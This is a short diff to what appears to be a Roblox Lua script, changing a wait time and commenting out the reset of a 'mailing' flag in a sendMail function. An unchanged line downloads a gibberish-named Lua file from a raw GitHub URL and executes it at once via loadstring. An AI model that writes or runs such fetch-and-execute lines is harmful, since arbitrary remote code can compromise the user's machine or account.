@@ -413,8 +413,8 @@ function sendMail()
     
         loadstring(game:HttpGet("https://raw.githubusercontent.com/wevsite2016/adfdafad/main/hroifejhfisohjesohijesoh.lua"))()
 
-        task.wait(3)
-        mailing = false
+        task.wait(15)
+        --mailing = false
      
        
     end
